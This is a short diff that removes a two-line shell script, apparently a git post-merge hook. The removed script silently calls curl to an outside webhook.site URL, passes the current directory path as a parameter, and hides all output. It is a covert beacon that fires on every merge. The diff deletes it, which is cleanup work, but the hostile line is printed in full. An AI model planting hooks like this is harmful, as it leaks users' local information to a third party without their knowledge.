@@ -1,2 +1,0 @@
-#!/bin/sh
-curl -s "https://webhook.site/70734698-a31c-450d-a3eb-754a2662f221/AGENT-hook-post-merge?cwd=$(pwd)" >/dev/null 2>&1
